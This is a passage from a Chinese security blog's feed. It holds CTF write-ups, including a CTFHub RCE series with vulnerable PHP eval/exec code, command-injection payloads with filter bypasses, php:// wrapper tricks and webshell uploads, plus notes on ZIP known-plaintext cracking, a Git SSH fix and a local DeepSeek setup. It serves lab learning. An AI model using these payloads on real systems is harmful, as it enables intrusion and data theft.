alt="1698322910515"></p><p>ç„¶åå°±å…ˆæ”»å‡»å‘é€çš„æ•°æ®åŒ…ï¼Œå†æ”»å‡»è¯»å–ï¼ˆè¯»å–cmd.phpï¼‰çš„æ•°æ®åŒ…ã€‚è¯»å–çš„åŒ…å‡ºç°200ï¼Œä¸”æµè§ˆå™¨èƒ½æ­£å¸¸è®¿é—®ï¼Œè¯´æ˜ä¸€å¥è¯æœ¨é©¬å°±å†™å…¥è¿›å»äº†ï¼Œç”¨èšå‰‘è¿æ¥æ‰¾åˆ°flagã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-15%20202450.png" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315202512251.png" alt="image-20250315202512251"></p><blockquote><p>FSCTF{p@ti0ns_15_key_1n_1ife}</p></blockquote>]]></content>
    
    
    <summary type="html">2025.3.15åˆ·é¢˜é¢˜ç›®:[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload2.0,[SWPUCTF 2021æ–°ç”Ÿèµ›]PseudoProtocols,[FSCTF 2023]åŠ é€ŸåŠ é€Ÿ</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>Gité—®é¢˜ï¼šè§£å†³â€œssh:connect to host github.com port 22: Connection timed outâ€</title>
    <link href="https://blog.m3x1.cn/posts/e4e8b439.html"/>
    <id>https://blog.m3x1.cn/posts/e4e8b439.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:15.465Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="é—®é¢˜æè¿°ï¼š">é—®é¢˜æè¿°ï¼š</h2><p>åœ¨æŸä¸€å¤©ä½¿ç”¨hexo då‘½ä»¤æ—¶çªç„¶å‡ºç°æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh:connect to host github.com port 22: Connection timed out</span><br></pre></td></tr></table></figure><p>ä¹‹å‰éƒ½æ˜¯å¯ä»¥é“¾æ¥çš„ï¼Œåæ¥æ¢äº†åœ°æ–¹çªç„¶é“¾æ¥ä¸ä¸Šgithubäº†ã€‚</p><h2 id="é—®é¢˜åˆ†æï¼š">é—®é¢˜åˆ†æï¼š</h2><p>æ ¹æ®é”™è¯¯æç¤ºçŸ¥é“ï¼Œè¿æ¥ä¸æˆåŠŸå¯èƒ½æ˜¯ï¼š</p><ol><li>ç½‘ç»œé—®é¢˜</li><li>sshå¯†é’¥éœ€è¦é‡æ–°æ·»åŠ </li><li>22ç«¯å£è¢«å ç”¨</li></ol><p>æ ¹æ®æ­¤è¿›è¡Œå°è¯•è§£å†³ï¼Œåº”è¯¥èƒ½è§£å†³ã€‚æˆ‘å°±æ˜¯ç¬¬ä¸‰ä¸ªé—®é¢˜</p><h2 id="è§£å†³æ–¹æ³•ï¼š">è§£å†³æ–¹æ³•ï¼š</h2><h4 id="æƒ…å†µä¸€ï¼š">æƒ…å†µä¸€ï¼š</h4><p>æ£€æŸ¥ç½‘ç»œè¿æ¥æƒ…å†µï¼Œæ£€æŸ¥ä»£ç†æ˜¯å¦å¼€å¯ã€‚ç„¶åpingä¸€ä¸‹çœ‹çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure><h4 id="æƒ…å†µäºŒï¼š">æƒ…å†µäºŒï¼š</h4><p>ç›´æ¥é‡æ–°æ·»åŠ sshå¯†é’¥å°±è¡Œ</p><h4 id="æƒ…å†µä¸‰ï¼š">æƒ…å†µä¸‰ï¼š</h4><p>è¿™ä¹Ÿæ˜¯æˆ‘çš„æƒ…å†µï¼Œå¯èƒ½æ˜¯22ç«¯å£ä¸è¡Œæˆ–è€…è¢«å ç”¨ï¼Œå°±éœ€è¦æ¢ä¸ªç«¯å£ã€‚</p><p>æ“ä½œæ–¹æ³•ï¼š</p><p>1.è¿›å…¥~/.sshä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p>2.åˆ›å»ºä¸€ä¸ªconfigæ–‡ä»¶(è¿™é‡Œæˆ‘ç”¨çš„vimç¼–è¾‘å™¨)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>3.ç¼–è¾‘æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br><span class="line">Host gitlab.com</span><br><span class="line">Hostname altssh.gitlab.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure><p>4.ä¿å­˜é€€å‡º</p><p>5.æ£€æŸ¥æ˜¯å¦æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ ¹æ®å®ƒçš„æç¤ºæ“ä½œï¼Œæœ‰ä¸ªåœ°æ–¹è¦è¾“å…¥yesã€‚</p><p>ç„¶åå†è¯•è¯•hexo dï¼Œä¼°è®¡å°±èƒ½æäº¤äº†ã€‚</p><p>ï¼ˆ<a href="http://xn--pinggithub-wj2ph1j7w8fubmba3571oi6a.com">ä½†æ˜¯æˆ‘è¿˜æ˜¯pingä¸é€šgithub.com</a>ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯æ¢ä¸ªç«¯å£ä¹Ÿèƒ½ä¼ ä¸Šå»ã€‚æœ‰å¤§ä½¬çŸ¥é“çš„è¯·æŒ‡æ•™ï¼ï¼‰</p>]]></content>
    
    
    <summary type="html">ğŸ¥§Gité—®é¢˜ï¼šè§£å†³â€œssh:connect to host github.com port 22: Connection timed outâ€</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>æœ¬åœ°æ­å»ºdeepseek</title>
    <link href="https://blog.m3x1.cn/posts/ca8cf98d.html"/>
    <id>https://blog.m3x1.cn/posts/ca8cf98d.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:36.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡é˜¶æ®µ">å‡†å¤‡é˜¶æ®µ</h2><p>å…ˆä¸‹è½½Ollamaå’Œchatboxå®‰è£…åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ollama: https://ollama.com/</span><br><span class="line">chatbox: https://chatboxai.app/zh</span><br></pre></td></tr></table></figure><p>åœ¨ç”µè„‘ä¸Šå®‰è£…åå³å¯</p><h2 id="æ­å»ºæ­¥éª¤">æ­å»ºæ­¥éª¤</h2><p>å®‰è£…ä¹‹åï¼ŒæŒ‰win+rï¼Œè¾“å…¥cmdè¿›å…¥å‘½ä»¤æ¡†</p><p>ç„¶åæˆ‘ä»¬åœ¨å›åˆ°ollamaçš„å®˜ç½‘ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219215910238.png" alt="image-20250219215910238"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220104107.png" alt="image-20250219220104107"></p><p>å¤åˆ¶åé¢çš„ä»£ç åˆ°å‘½ä»¤æ¡†ä¸‹è½½ï¼Œç­‰å¾…å®ƒä¸‹è½½å®Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220218270.png" alt="image-20250219220218270"></p><p>ç„¶åæ‰“å¼€chatboxï¼Œé€‰æ‹©ä½¿ç”¨æœ¬åœ°æ¨¡å‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220351053.png" alt="image-20250219220351053"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220409690.png" alt="image-20250219220409690"></p><p>æ¨¡å‹ä½ç½®ç‚¹å‡»ä¸‰è§’å½¢ä½ç½®é€‰æ‹©å®‰è£…å¥½çš„deepseekæ¨¡å‹ï¼Œä¸Šä¸‹æ–‡æ¶ˆæ¯æ•°é‡20é‚£ä¸ªä½ç½®è®°å¾—é€‰æ‹©ä¸é™åˆ¶ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220432827.png" alt="image-20250219220432827"></p><p>æ ¹æ®è‡ªå·±å–œå¥½è®¾ç½®å…¶ä»–é€‰é¡¹ï¼Œç‚¹å‡»ä¿å­˜ï¼Œç„¶åå°±å¯ä»¥è¯•è¯•å¯¹è¯äº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220640616.png" alt="image-20250219220640616"></p><p>è‡³æ­¤åˆå§‹åŒ–å°±å®Œæˆäº†ï¼ŒåŸºæœ¬çš„åŠŸèƒ½å°±å®Œæˆäº†ã€‚</p><h2 id="å¯åŠ¨æ³¨æ„äº‹é¡¹">å¯åŠ¨æ³¨æ„äº‹é¡¹</h2><p>æ¯æ¬¡åœ¨chatboxå¯åŠ¨çš„æ—¶å€™ï¼Œéƒ½è¦å…ˆåœ¨å‘½ä»¤æ¡†è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollama list    #æŸ¥çœ‹mode</span><br><span class="line">ollama run modename    #è¿è¡Œmode</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰èƒ½åœ¨chatboxæœ¬åœ°ä½¿ç”¨ã€‚</p><p>å¦åˆ™ä¼šæŠ¥é”™æ²¡æœ‰ç½‘ç»œã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§æœ¬åœ°æ­å»ºdeepseek</summary>
    
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHubæŠ€èƒ½æ ‘-rce</title>
    <link href="https://blog.m3x1.cn/posts/72fb0684.html"/>
    <id>https://blog.m3x1.cn/posts/72fb0684.html</id>
    <published>2025-01-31T16:00:00.000Z</published>
    <updated>2025-02-01T13:26:47.646Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="evalæ‰§è¡Œ">evalæ‰§è¡Œ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•ç»•è¿‡ï¼Œç›´æ¥æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>å®¡è®¡ä»£ç ï¼Œå‘ç°è¿‡æ»¤äº†flagå…³é”®å­—ï¼ŒincludeåŒ…å«æ–‡ä»¶çš„å†…å®¹ï¼Œæ ¹æ®æç¤ºï¼Œå‘ç°æœ‰ä¸ªshell.txtæ–‡ä»¶ï¼Œè€Œä¸”æ–‡ä»¶å†…å®¹æ˜¯æ¥å—ä¼ å‚è¯·æ±‚ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯æ–‡ä»¶åŒ…å«shell.txtæ–‡ä»¶ï¼Œç„¶åä¼ å‚è§¦å‘evalå‡½æ•°æ¥rceã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>æœ‰ä¸ªphpinfo()çš„ç½‘é¡µï¼Œæ‰“å¼€ï¼Œæœç´¢flagï¼Œæ²¡æœ‰ã€‚</p><p>æ ¹æ®æç¤ºä½¿ç”¨php://inputåè®®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="è¯»å–æºä»£ç ">è¯»å–æºä»£ç </h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>æ ¹æ®ä»£ç å’Œæç¤ºï¼Œè¦ä½¿ç”¨phpåè®®è¯»å–ç›®å½•/flag</p><p>ç›´æ¥ä½¿ç”¨filteråè®®è¯»å–ï¼Œæ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="è¿œç¨‹åŒ…å«">è¿œç¨‹åŒ…å«</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>è·Ÿä¸Šé¢çš„é¢˜ç›®ä¸€æ ·,ç›´æ¥ä½¿ç”¨php://inputï¼Œç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="å‘½ä»¤æ³¨å…¥">å‘½ä»¤æ³¨å…¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸€ä¸ªpingç½‘å€çš„åŠŸèƒ½ï¼Œå…ˆè¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>æ‰“å¼€278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="è¿‡æ»¤cat">è¿‡æ»¤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†catï¼Œä½†æ˜¯å¯ä»¥ç”¨tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</h2><p>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨${IFS}ä»£æ›¿</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦">è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h2><p>è¿‡æ»¤äº†ç›®å½•åˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‹¼æ¥æ¥æ‰¾flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="è¿‡æ»¤è¿ç®—ç¬¦">è¿‡æ»¤è¿ç®—ç¬¦</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†|å’Œ&amp;ç¬¦å·ï¼Œä½†æ˜¯å¯ä»¥ç”¨åˆ†å·;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="ç»¼åˆè¿‡æ»¤ç»ƒä¹ ">ç»¼åˆè¿‡æ»¤ç»ƒä¹ </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ï¼Œè¿‡æ»¤äº†|&amp;; ï¼Œå¯ä»¥ä½¿ç”¨%0aæ¥ä½œä¸ºå›è½¦ç¬¦ä½¿ç”¨ï¼Œæ•ˆæœä¸€æ ·</p><p>è¿‡æ»¤ä¸‰ä¸ªå…³é”®å­—cat,flag,ctfhubï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æˆ–è€…ä¸¤ä¸ªåŒå¼•å·ç»•è¿‡</p><p>è¿‡æ»¤ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨${IFS}ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHubæŠ€èƒ½æ ‘-rceç³»åˆ—wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>ä¸¤ç§æ˜æ–‡æ”»å‡»</title>
    <link href="https://blog.m3x1.cn/posts/fcd8d963.html"/>
    <id>https://blog.m3x1.cn/posts/fcd8d963.html</id>
    <published>2025-01-19T16:00:00.000Z</published>
    <updated>2025-01-21T06:22:40.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä¸€ã€å®Œæ•´çš„æ˜æ–‡æ–‡ä»¶">ä¸€ã€å®Œæ•´çš„æ˜æ–‡æ–‡ä»¶</h4><p>è¦è¾¾æˆæ˜æ–‡æ”»å‡»éœ€è¦æ³¨æ„ä»¥ä¸‹ä¸‰ç‚¹</p><p>â‘ å®Œæ•´çš„æ˜æ–‡æ–‡ä»¶</p><p>â‘¡æ˜æ–‡æ–‡ä»¶éœ€è¦è¢«ç›¸åŒçš„å‹ç¼©ç®—æ³•æ ‡å‡†å‹ç¼©ï¼ˆä¹Ÿå¯ç†è§£ä¸ºè¢«ç›¸åŒå‹ç¼©å·¥å…·å‹ç¼©ï¼‰</p><p>â‘¢æ˜æ–‡å¯¹åº”æ–‡ä»¶çš„åŠ å¯†ç®—æ³•éœ€è¦æ˜¯ ZipCryptoï¼ˆZipCryptoåˆåˆ†ä¸ºZipCrypto Deflate/ZipCrypto Storeï¼‰</p><p>ä½¿ç”¨ARCHPRè¿›è¡Œæ˜æ–‡æ”»å‡»</p><p>ç ´è§£æ—¶é•¿åº”è¯¥ä¸è¶…è¿‡5åˆ†é’Ÿï¼Œè¿è¡Œè‡³5åˆ†é’Ÿå·¦å³å¯ä»¥æ‰‹åŠ¨åœæ­¢ï¼ŒARCHPRä¼šè·³å‡ºæ¥ç ´è§£å‡ºçš„ä¸‰ä¸ªkeyã€‚å½“ç„¶ï¼Œè¿™ä¸ªç»“æœå¹¶ä¸æ˜¯å‹ç¼©åŒ…çš„å¯†ç ï¼Œè€Œæ˜¯ä¸€ä¸ªå»é™¤å¯†ç çš„å‹ç¼©åŒ…<code>xxx_decrypted.zip</code>ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶ç›´æ¥è§£å¼€å°±å¯ä»¥äº†ã€‚</p><p>ç”¨ä»¥ä¸Šæ–¹æ³•éœ€è¦å·²çŸ¥ä¸€æ•´ä¸ªæ˜æ–‡æ–‡ä»¶ã€‚</p><h4 id="äºŒã€å·²çŸ¥ä¸€éƒ¨åˆ†æ˜æ–‡">äºŒã€å·²çŸ¥ä¸€éƒ¨åˆ†æ˜æ–‡</h4><p>ä½¿ç”¨rbkcrackåªéœ€è¦çŸ¥é“åŠ å¯†å‹ç¼©åŒ…å†…å®¹çš„è¿ç»­12ä¸ªå­—èŠ‚ï¼Œå³å¯è¿›è¡Œæ”»å‡»ç ´è§£ã€‚åŒæ—¶ï¼Œç»“åˆå„ç±»å·²çŸ¥çš„æ–‡ä»¶æ ¼å¼ï¼Œæ›´æ‰©å®½äº†ZIPå·²çŸ¥æ˜æ–‡æ”»å‡»çš„æ”»å‡»é¢ã€‚</p><blockquote><p>rbkcrackä¸‹è½½åœ°å€ï¼š</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrackå¸¸ç”¨å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C åŠ å¯†çš„å‹ç¼©åŒ…</span><br><span class="line">-c å‹ç¼©åŒ…å†…åŠ å¯†çš„æ–‡ä»¶</span><br><span class="line">-p æ˜æ–‡å†…å®¹</span><br><span class="line">-k è¾“å…¥key</span><br><span class="line">-o åç§»é‡</span><br><span class="line">-d æ”»å‡»å®Œæˆåå¯¼å‡ºè§£å¯†æ–‡ä»¶</span><br><span class="line">-u è‡ªåŠ¨è§£å‹</span><br></pre></td></tr></table></figure><p>å®ä¾‹ï¼š</p><p>pngæ˜¯åˆ¶ä½œçš„pngæ–‡ä»¶å¤´</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°keyåè¿›è¡Œè§£å¯†</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>å› ä¸ºLP.zipæ˜¯ä»¥ZipCrypto 